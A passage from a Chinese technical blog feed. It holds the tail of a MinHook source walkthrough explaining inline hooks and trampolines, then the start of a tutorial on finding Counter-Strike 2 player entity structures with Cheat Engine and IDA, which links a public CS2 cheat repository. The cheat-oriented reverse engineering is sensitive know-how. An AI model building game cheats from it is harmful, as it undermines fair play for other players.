class="line">lpMaximumApplicationAddress</span><br></pre></td></tr></table></figure><p>指向应用程序和 DLL 可访问的最高内存地址的指针。</p></li><li><p>在64位下寻找一块距离参数<code>pOrigin</code>最近的内存地址，作者这里对这种内存自行进行了管理，用的单链表（Windows的内存管理）</p></li></ul><p>接着再回到创建Hook中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pBuffer != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    TRAMPOLINE ct;</span><br><span class="line"></span><br><span class="line">    ct.pTarget     = pTarget;</span><br><span class="line">    ct.pDetour     = pDetour;</span><br><span class="line">    ct.pTrampoline = pBuffer;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CreateTrampolineFunction</span>(&amp;ct))</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateTrampolineFunction</span><span class="params">(PTRAMPOLINE ct)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)    </span></span></span><br><span class="line"><span class="function">    CALL_ABS call </span>= &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x00000002</span>, <span class="comment">// FF15 00000002: CALL [RIP+8]</span></span><br><span class="line">        <span class="number">0xEB</span>, <span class="number">0x08</span>,             <span class="comment">// EB 08:         JMP +10</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;</span><br><span class="line">    JMP_ABS jmp = &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x00000000</span>, <span class="comment">// FF25 00000000: JMP [RIP+6]</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;</span><br><span class="line">    JCC_ABS jcc = &#123;</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x0E</span>,             <span class="comment">// 7* 0E:         J** +16</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x00000000</span>, <span class="comment">// FF25 00000000: JMP [RIP+6]</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;    </span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算汇编指令长度</span></span><br><span class="line">        copySize = <span class="built_in">HDE_DISASM</span>((LPVOID)pOldInst, &amp;hs);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (oldPos &gt;= <span class="built_in">sizeof</span>(JMP_REL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The trampoline function is long enough.</span></span><br><span class="line">            <span class="comment">// Complete the function with the jump to the target function.</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">            jmp.address = pOldInst;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            jmp.operand = (UINT32)(pOldInst - (pNewInst + <span class="built_in">sizeof</span>(jmp)));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            pCopySrc = &amp;jmp;</span><br><span class="line">            copySize = <span class="built_in">sizeof</span>(jmp);</span><br><span class="line"></span><br><span class="line">            finished = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ALLOW_INTRINSICS</span></span><br><span class="line">        <span class="built_in">memcpy</span>((LPBYTE)ct-&gt;pTrampoline + newPos, pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __movsb((LPBYTE)ct-&gt;pTrampoline + newPos, (LPBYTE)pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        newPos += copySize;</span><br><span class="line">        oldPos += hs.len;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!finished);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">    <span class="comment">// Create a relay function.</span></span><br><span class="line">    jmp.address = (ULONG_PTR)ct-&gt;pDetour;</span><br><span class="line"></span><br><span class="line">    ct-&gt;pRelay = (LPBYTE)ct-&gt;pTrampoline + newPos;</span><br><span class="line">    <span class="built_in">memcpy</span>(ct-&gt;pRelay, &amp;jmp, <span class="built_in">sizeof</span>(jmp));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br></pre></td></tr></table></figure><ul><li><code>HDE_DISASM</code>：跟进去是解析汇编指令，计算出当前函数的汇编指令长度。使用的是作者改进过的<code>Hacker Disassembler Engine 64</code>，看了下版权信息还挺古早的</li><li><code>pCopySrc</code>：如果相差很近，能使用<code>jmp</code>则使用<code>jmp</code>，根据条件得到对应的跳转指令</li><li><code>ct-&gt;pRelay</code>：存放跳转的指令</li></ul><p>这边感觉作者写的有点复杂，不过确实是好用的，解析反汇编的方法又学到一些，这里看不懂的可以看看后面的动调的解释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">        PHOOK_ENTRY pHook = <span class="built_in">AddHookEntry</span>();</span><br><span class="line">        <span class="keyword">if</span> (pHook != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;oldIPs, ct.oldIPs, <span class="built_in">ARRAYSIZE</span>(ct.oldIPs));</span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;newIPs, ct.newIPs, <span class="built_in">ARRAYSIZE</span>(ct.newIPs));</span><br></pre></td></tr></table></figure><p>这里就存储计算出的指令和原始汇编，便于后续启用hook的时候使用<br />这里的<code>AddHookEntry</code>的时候就已经将返回地<code>pHook</code>加入到<code>g_hook</code>中管理了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line"><span class="keyword">if</span> (ct.patchAbove)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(</span><br><span class="line">                pHook-&gt;backup,</span><br><span class="line">                (LPBYTE)pTarget - <span class="built_in">sizeof</span>(JMP_REL),</span><br><span class="line">                <span class="built_in">sizeof</span>(JMP_REL) + <span class="built_in">sizeof</span>(JMP_REL_SHORT));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;backup, pTarget, <span class="built_in">sizeof</span>(JMP_REL));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ppOriginal != <span class="literal">NULL</span>)</span><br><span class="line">            *ppOriginal = pHook-&gt;pTrampoline;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f3362dda366faccd859c9ca71a309e89.png" alt="image-20240724181309357" /></p><p><strong>pHook-&gt;pTrampoline</strong>：这里指向的是旧的Sleep的jmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007FFAD228B0B0  jmp         qword ptr [7FFAD22F0A10h]  </span><br></pre></td></tr></table></figure><p>hook的时候变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007FFAD228B0B0  jmp         00007FFAD2260FC7</span><br></pre></td></tr></table></figure><p>但是要hook的地址不是jmp呢？这里用到最开始的hello的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*myhello)</span><span class="params">()</span></span>;</span><br><span class="line">myhello lpOldHello = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;myhello&gt;(lpOldHello)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">MH_Initialize</span>();</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(hello, newhello, <span class="built_in">reinterpret_cast</span>&lt;LPVOID*&gt;(&amp;lpOldHello));</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="built_in">MH_DisableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常调用<code>hello</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007FF7F1953E64  call        hello (07FF7F1953E10h)  </span><br><span class="line"></span><br><span class="line">void hello() &#123;</span><br><span class="line">00007FF7F1953E10  sub         rsp,28h</span><br></pre></td></tr></table></figure><p>hook过后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007FF6D2C13E47  call        qword ptr [lpOldHello (07FF6D2C18898h)] </span><br><span class="line"></span><br><span class="line">void hello() &#123;</span><br><span class="line">00007FF7F1953E10  jmp         00007FF7F1940FD9  </span><br></pre></td></tr></table></figure><p>在hook中调用原始函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00007FF7F1953E47  call        qword ptr [lpOldHello (07FF7F1958898h)]</span><br><span class="line"></span><br><span class="line">00007FF7F1940FC0  sub         rsp,28h  </span><br><span class="line">00007FF7F1940FC4  lea         rdx,[__xmm@ffffffffffffffffffffffffffffffff+10h (07FF7F1956370h)]  </span><br><span class="line">00007FF7F1940FCB  jmp         qword ptr [7FF7F1940FD1h] </span><br><span class="line"></span><br><span class="line">00007FF7F1953E22  call        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt; &gt; (07FF7F1953F40h) </span><br></pre></td></tr></table></figure><p>这里就已经说明的很清楚了，<strong>我们覆盖前几个字节会污染汇编指令，MinHook会把收到污染的汇编指令复制到一个地方A，A的尾部跳转到原有函数中没有收到污染的部分。</strong></p><p><strong>启用hook后修改原始函数的指针到A，这样A执行完后就会执行原函数没有污染的部分</strong></p><h2 id="mh_enablehook-enablehook"><a class="markdownIt-Anchor" href="#mh_enablehook-enablehook"></a> MH_EnableHook || EnableHook</h2><p>其实调用的是<code>EnableHook</code>，参数为true</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (g_hooks.pItems[pos].isEnabled != enable)</span><br><span class="line">&#123;</span><br><span class="line">    FROZEN_THREADS threads;</span><br><span class="line">    status = <span class="built_in">Freeze</span>(&amp;threads, pos, ACTION_ENABLE);</span><br><span class="line">    <span class="keyword">if</span> (status == MH_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        status = <span class="built_in">EnableHookLL</span>(pos, enable);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Unfreeze</span>(&amp;threads);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>EnableHookLL：不管是不是启用全部hook，最终都会来到这里</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LPBYTE pPatchTarget = (LPBYTE)pHook-&gt;pTarget;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(pPatchTarget, patchSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">    <span class="keyword">return</span> MH_ERROR_MEMORY_PROTECT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (enable)</span><br><span class="line">&#123;</span><br><span class="line">    PJMP_REL pJmp = (PJMP_REL)pPatchTarget;</span><br><span class="line">    pJmp-&gt;opcode = <span class="number">0xE9</span>;</span><br><span class="line">    pJmp-&gt;operand = (UINT32)((LPBYTE)pHook-&gt;pDetour - (pPatchTarget + <span class="built_in">sizeof</span>(JMP_REL)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pHook-&gt;patchAbove)</span><br><span class="line">    &#123;</span><br><span class="line">        PJMP_REL_SHORT pShortJmp = (PJMP_REL_SHORT)pHook-&gt;pTarget;</span><br><span class="line">        pShortJmp-&gt;opcode = <span class="number">0xEB</span>;</span><br><span class="line">        pShortJmp-&gt;operand = (UINT8)(<span class="number">0</span> - (<span class="built_in">sizeof</span>(JMP_REL_SHORT) + <span class="built_in">sizeof</span>(JMP_REL)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先确保有足够权限，然后转为<code>PJMP_REL</code>类型的结构体，通过该结构体修改位对应的<code>jmp</code>跳转</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fecdbf44839af6ff24e2c61e4aabea63.png" alt="image-20240724184129018" /></p><p>第一次jmp后的地址还有一个jmp到指针，这里的指令就是<code>MH_CreateHook</code>时创造出来的</p><p>后续的就是取消hook和释放一些全局变量，取消hook用到的是<code>EnableHook</code>，参数为false，因为两个都需要修改函数的汇编指令码。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;世界上果然没有魔法，到最后发现都是魔术&lt;/p&gt;
&lt;p&gt;解读的项目地址：&lt;a href=&quot;https://github.com/TsudaKageyu/minhook&quot;&gt;https://github.com/TsudaKageyu/minhook&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw&quot;&gt;https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="MinHook" scheme="https://joe1sn.eu.org/tags/MinHook/"/>
    
  </entry>
  
  <entry>
    <title>【破解】CS2人物实体逆向</title>
    <link href="https://joe1sn.eu.org/2024/06/01/crackme-cs2-entity-controller/"/>
    <id>https://joe1sn.eu.org/2024/06/01/crackme-cs2-entity-controller/</id>
    <published>2024-06-01T03:07:53.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>如何结合Cheat Engine和逆向工程找到CS2内存中的人物地址</p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><p>这篇文章发布的时候，关于更多CS2-cheats的代码已经在Github仓库中发布，你可以在下面的链接找到更多CS2的外挂功能</p><p><a href="https://github.com/Joe1sn/ExtCheats">https://github.com/Joe1sn/ExtCheats</a></p><h1 id="游戏环境"><a class="markdownIt-Anchor" href="#游戏环境"></a> 游戏环境</h1><p>Steam上启动的CS2国际服，在设置中加上<code>-insecure</code>参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/87cee640b773cf05f245d8edc362b4c5.png" alt="image-20240520124758128" /></p><p>在游戏中启用控制台，然后 ` 就可以输入命令了</p><p>CS2可以使用<code>CFG</code>文件进行快速的加载，这里我用了一段cfg脚本来进行编写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sv_cheats 1</span><br><span class="line">mp_roundtime 60</span><br><span class="line">mp_roundtime_defuse 60</span><br><span class="line">mp_warmup_end</span><br><span class="line">mp_freezetime 0</span><br><span class="line">mp_maxrounds 30</span><br><span class="line">mp_buytime 99999</span><br><span class="line">bot_stop 1</span><br><span class="line">bot_dont_shoot 1</span><br><span class="line">mp_respawn_on_death_t 1</span><br><span class="line">mp_respawn_on_death_ct 1</span><br><span class="line">mp_restartgame  1</span><br></pre></td></tr></table></figure><p>你可以在<code>steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\cfg</code>中防止该文件，然后再游戏中使用<code>exec &lt;不含后缀的文件名&gt;</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/9ef8f9ceaa881fe581b12a0943f62ec6.png" alt="image-20240520125021129" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/c48e395f66ac9eef3929d6c10c853dfe.png" alt="image-20240520125058628" /></p><p>为了方便调试，可以把屏幕大小改为<code>1280x600</code></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/74ba85dd992ea54cd1a79ae8b75b70db.png" alt="image-20240520125243904" /></p><h1 id="playerpawn"><a class="markdownIt-Anchor" href="#playerpawn"></a> PlayerPawn</h1><h2 id="简单的ce使用"><a class="markdownIt-Anchor" href="#简单的ce使用"></a> 简单的CE使用</h2><p>首先使用准确值找到HP值</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a66b6ebaa34b9bad4a99816bcc458eed.png" alt="image-20240520125402361" /></p><p>在游戏中可以使用<code>hurtme xx</code>来对自身角色造成伤害</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/e502eb8f0026136056413c3efe07fb46.png" alt="image-20240520125441150" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dbb9d3396efa8c05038998404b55ab39.png" alt="image-20240520125456873" /></p><p>这样就找到了几个类似的值，这里有几个要点</p><ul><li>由于在真实游戏中我们能控制的只有客户端，没有服务端程序，CS的客户端位于<code>client.dll</code>中，所以我们需要对其进行分析，而且地址最好和该dll相关</li><li>cs2使用了<code>Valve</code>研发的<code>source2</code>引擎，所以我们可以利用相关开源信息进行查找，比如有人做了cs2偏移的仓库：<a href="https://github.com/a2x/cs2-dumper">https://github.com/a2x/cs2-dumper</a> 。</li></ul><p>接着找出有哪些地址访问了这些地址，这里有一个取巧的方法，利用上面的偏移，比如HP的全称是<code>Health Point</code>，那么变量的命名就可能和<code>heal</code>相关，在上面推荐的仓库就可以找到</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/174c8f04224146efafe2c907f72e9e54.png" alt="image-20240520130140134" /></p><p>那么对上面的内存找访问</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/68f0004d76769d803818a7b64a5f1d34.png" alt="image-20240520130240365" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/03d02173e2ae2bd2f2db97c9dac4c594.png" alt="image-20240520130346862" /></p><p>添加该<code>RCX</code>的值，在 浏览相关内存-&gt;工具-&gt;解析结构体中</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2de4194f57d7071632841ab260988543.png" alt="image-20240520130516581" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/97245ce6127ba458b893e37ef8cfbf64.png" alt="image-20240520130529294" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/b500fc73d0ce31fa297cc203e886c516.png" alt="image-20240520130615406" /></p><p>我们发现了一个为<code>C_CSPlayerPawn</code>的结构体，接着我们看访问的代码，有两段</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/55f1ccc37d28a2d4bf986d8910560504.png" alt="image-20240520140501547" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/bd1647266add8cdbbae304f9ffa61e8d.png" alt="image-20240520140630234" /></p><p>那我们就打开<code>client.dll</code>，分析下这段代码</p><p>文件位于<code>steam\steamapps\common\Counter-Strike Global Offensive\game\csgo\bin\win64</code></p><p>第一段可能为虚函数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/49225f9ea8e9b7f3a453da47219eb08b.png" alt="image-20240520140659150" /></p><p>第二段位于另外一个函数中，我们主要看<code>rsi</code>怎么取到的值，结果发现是这个函数的参数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7902c6029b14d53a3aa577441a5d56f9.png" alt="image-20240520140754947" /></p><p>多看看交叉引用发现引用太复杂，随后放弃</p><h1 id="playercontroller"><a class="markdownIt-Anchor" href="#playercontroller"></a> PlayerController</h1><h2 id="从全局变量找到controller"><a class="markdownIt-Anchor" href="#从全局变量找到controller"></a> 从全局变量找到Controller</h2><p>继续按照上一面的找搜索到的HP的一堆地址的访问地址，发现</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/87a2c365f46f6fa73c4065c0032f9edf.png" alt="image-20240520135821227" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2bebd506ba9d123ef30f43eebdda5d90.png" alt="image-20240520135923299" /></p><p>同样的方法我们找到这段代码，然后在IDA中分析</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a1332097022cc49cae2006c9293eaab2.png" alt="image-20240520131122904" /></p><p>IDA中的基地址从<code>0x180000000</code>开始，加上偏移<code>521BB0</code>就找到了这段代码，然后对该函数的引用分析</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5ceac3df098aba05becacac0b2ff67a1.png" alt="image-20240520131226822" /></p><p>发现普遍存在这几个函数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7342cf49a6af2b4dc0a095fe26d19ab8.png" alt="image-20240520131345205" /></p><p>我们先分析下他是这么找到<code>v12</code>的，首先在<code>sub_180697FA0</code>传入了一个<code>v10</code></p><p>先分析<code>sub_180697FA0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_180697FA0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !off_18172EEE0 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt;= *(off_18172EEE0 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  v1 = sub_18060A050(qword_18191C5B8, (a1 + <span class="number">1</span>));</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  v3 = (*(*v1 + <span class="number">0x480</span>i64))(v1);</span><br><span class="line">  v4 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在全局变量<code>qword_18191C5B8</code>，在CE中分析一下</p><p>分析其中的<code>sub_18060A050</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18060A050</span><span 